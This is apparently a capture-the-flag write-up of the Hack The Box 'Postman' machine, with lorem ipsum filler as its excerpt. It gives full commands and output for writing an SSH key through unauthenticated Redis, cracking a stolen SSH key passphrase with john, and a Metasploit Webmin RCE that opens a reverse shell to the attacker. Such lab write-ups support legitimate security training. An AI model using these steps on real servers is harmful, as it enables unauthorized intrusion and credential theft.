---
layout: single
title: Postman - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-11-08
classes: wide
header:
  teaser: /assets/images/htb-writeup-postman/postman_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-postman/postman_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. nmap -Pn -sC -sV -n postman.htb
    PORT      STATE SERVICE VERSION
    22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
    |   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
    |_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
    80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: The Cyber Geek's Personal Website
    10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
    |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  nmap -Pn -sV -n -p- postman.htb
    PORT      STATE SERVICE VERSION
    22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
    6379/tcp  open  redis   Redis key-value store 4.0.9
    10000/tcp open  http    MiniServ 1.910 (Webmin httpd)

  nmap -Pn -sV -n -sU postman.htb
    PORT      STATE SERVICE VERSION
    10000/udp open  webmin  (https on TCP port 10000)

2. Enumerate port 80/10000 with dirb and nikto
    loot:
      .. http://postman.htb/css/
      .. http://postman.htb/fonts/
      .. http://postman.htb/images/
      .. http://postman.htb/js/
      .. http://postman.htb/upload/
      .. https://postman.htb:10000/

3. Redis on port 6379 seems to be unauthenticated, we can reach it using redic-cli -h postman.htb
   This can be exploited to give us a reverse shell uploading our public key to authorized_keys.
   We can either do this manually, or automatically with the script redis.py
    (https://github.com/Avinash-acid/Redis-Server-Exploit)

    --- MANUALLY ---
    root@p3:/opt/htb/machines/postman# ssh-keygen -t rsa
      Generating public/private rsa key pair.
      Enter file in which to save the key (/root/.ssh/id_rsa): postman-id_rsa
      Enter passphrase (empty for no passphrase):                                   (blank)
      Enter same passphrase again:                                                  (blank)
      Your identification has been saved in postman-id_rsa.
      Your public key has been saved in postman-id_rsa.pub.
      The key fingerprint is:
      SHA256:JNjykISF8kNnxmrqE9LuEAruVeV7AKpiSIKJJZrWhCw root@p3
      The key's randomart image is:
      +---[RSA 3072]----+
      |   =o            |
      |o =.=+           |
      |E*.*=.o..        |
      |==B .++o         |
      |X* + ..oS        |
      |@oo .   o        |
      |B=..   . .       |
      |++o     .        |
      | oo              |
      +----[SHA256]-----+

    root@p3:/opt/htb/machines/postman# (echo -e "\n\n"; cat postman-id_rsa.pub; echo -e "\n\n") > postman-pub.txt

    root@p3:/opt/htb/machines/postman# cat postman-pub.txt | redis-cli -h postman.htb -x set p3-key
      OK

    root@p3:/opt/htb/machines/postman# redis-cli -h postman.htb
      postman.htb:6379> config set dir /var/lib/redis/.ssh
        OK
      postman.htb:6379> config get dir
        1) "dir"
        2) "/var/lib/redis/.ssh"
      postman.htb:6379> keys *
        1) "cracklist"
        2) "p3-key"
      postman.htb:6379> config set dbfilename "authorized_keys"
        OK
      postman.htb:6379> save
        OK

    root@p3:/opt/htb/machines/postman# ssh redis@postman.htb -i postman-id_rsa
      Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

       * Documentation:  https://help.ubuntu.com
       * Management:     https://landscape.canonical.com
       * Support:        https://ubuntu.com/advantage


       * Canonical Livepatch is available for installation.
         - Reduce system reboots and improve kernel security. Activate at:
           https://ubuntu.com/livepatch
      Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

      Last login: Fri Nov  8 10:14:53 2019 from 10.10.14.39
    redis@Postman:~$ id
      uid=107(redis) gid=114(redis) groups=114(redis)


    --- AUTOMATICALLY ---
    SYNTAX: python redis.py <TARGET-HOST> <TARGET USER>
    root@p3:/opt/htb/machines/postman# python redis.py postman.htb redis
      *******************************************************************
      * [+] [Exploit] Exploiting misconfigured REDIS SERVER*
      * [+] AVINASH KUMAR THAPA aka "-Acid"
      *******************************************************************


      SSH Keys Need to be Generated
      Generating public/private rsa key pair.
      Enter file in which to save the key (/root/.ssh/id_rsa): /opt/htb/machines/postman/id_rsa
      Enter passphrase (empty for no passphrase):
      Enter same passphrase again:
      Your identification has been saved in /opt/htb/machines/postman/id_rsa.
      Your public key has been saved in /opt/htb/machines/postman/id_rsa.pub.
      The key fingerprint is:
      SHA256:3g7innFErBgyZ0Gyddm3m2KtlZ691TebaXAnProOcE8 acid_creative
      The key's randomart image is:
      +---[RSA 3072]----+
      |  ..+ .o         |
      |   + o... .      |
      |  + +   o. .     |
      |   = o o  .      |
      |    . . S..+E    |
      |       oo+*o ..o.|
      |      o.+=oo..+o+|
      |     . =.oo...o.*|
      |     .+   ..=+.= |
      +----[SHA256]-----+
      	 Keys Generated Successfully
      OK
      OK
      OK
      (error) ERR Changing directory: Permission denied
      OK
      OK
      	You'll get shell in sometime..Thanks for your patience
      Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

       * Documentation:  https://help.ubuntu.com
       * Management:     https://landscape.canonical.com
       * Support:        https://ubuntu.com/advantage


       * Canonical Livepatch is available for installation.
         - Reduce system reboots and improve kernel security. Activate at:
           https://ubuntu.com/livepatch
      Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

      Last login: Fri Nov  8 10:19:49 2019 from 10.10.14.10
    redis@Postman:~$

4. Enumerating the box as user 'redis' shows us that user.txt is in the /home/Matt/, unfortunatley we don't have permissions.
   Snooping around further I found .bash_history in /var/lib/redis - within I can see commands to "id_rsa.bak".
   Search to for file using find:
     redis@Postman:~$ find / -name "id_rsa*"
      /opt/id_rsa.bak

    Looking at the file we can see that it is a .pem-file with des3 encryption and salt 73E9CEFBCCF5287C. To crack it we need to
    convert it, do it using sshng2john.
      root@p3:/usr/share/john# ./sshng2john.py /opt/htb/machines/postman/id_rsa.bak > /opt/htb/machines/postman/crack.txt
      root@p3:/opt/htb/machines/postman# john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
        Using default input encoding: UTF-8
        Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
        Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
        Cost 2 (iteration count) is 2 for all loaded hashes
        Will run 12 OpenMP threads
        Note: This format may emit false positives, so it will keep trying even after
        finding a possible candidate.
        Press 'q' or Ctrl-C to abort, almost any other key for status
        computer2008     (/opt/htb/machines/postman/id_rsa.bak)
        1g 0:00:00:03 DONE (2019-11-08 13:14) 0.2666g/s 3824Kp/s 3824Kc/s 3824KC/s  0125457423 ..*7¡Vamos!
        Session completed

5. We now have the creds for what I assume is user Matt, trying to SSH with the private key and found password (computer2008)
   is not working however.

   root@p3:/opt/htb/machines/postman# ssh matt@postman.htb -i id_rsa.bak
    Enter passphrase for key 'id_rsa.bak': computer2008
    Connection closed by 10.10.10.160 port 22

   Looking at the sshd_config I noticed that user Matt is blocked for SSH.
   redis@Postman:~$ cat /etc/ssh/sshd_config
    #	$OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $
    ..
    #deny users
    DenyUsers Matt
    ..

   Escalating from user redis to Matt internally however works just fine - grab user.txt
    redis@Postman:~$ su Matt
    Password:
    Matt@Postman:/var/lib/redis$ cat /home/Matt/user.txt
    517a****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. With Matt's creds (Matt:computer2008) we are now able to login to the webmin page - https://postman.htb:10000/
   Googling for Webmin 1.910 exploit shows that there are a RCE exploit using Metasploit. Use this exploit to get root.txt

   NOTE: I you get "[-] Exploit aborted due to failure: unknown: Failed to retrieve session cookie" when trying to use the exploit
         it's most likely a server-side error. Rebooting the box solved the error for me.

   msf5 > use exploit/linux/http/webmin_packageup_rce
   msf5 exploit(linux/http/webmin_packageup_rce) > options

   Module options (exploit/linux/http/webmin_packageup_rce):

      Name       Current Setting  Required  Description
      ----       ---------------  --------  -----------
      PASSWORD   computer2008     yes       Webmin Password
      Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
      RHOSTS     postman.htb      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
      RPORT      10000            yes       The target port (TCP)
      SSL        true             no        Negotiate SSL/TLS for outgoing connections
      TARGETURI  /                yes       Base path for Webmin application
      USERNAME   Matt             yes       Webmin Username
      VHOST                       no        HTTP server virtual host


   Payload options (cmd/unix/reverse_perl):

      Name   Current Setting  Required  Description
      ----   ---------------  --------  -----------
      LHOST  10.10.14.10      yes       The listen address (an interface may be specified)
      LPORT  4444             yes       The listen port


   Exploit target:

      Id  Name
      --  ----
      0   Webmin <= 1.910

   msf5 exploit(linux/http/webmin_packageup_rce) > run

      [*] Started reverse TCP handler on 10.10.14.10:4444
      [+] Session cookie: 501d3e007ae09b5c7b9e1bcbc8009649
      [*] Attempting to execute the payload...
      [*] Command shell session 1 opened (10.10.14.10:4444 -> 10.10.10.160:40192) at 2019-11-08 15:08:01 +0100

      whoami
      root
      cat /root/root.txt
      a257****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

REDIS
  https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
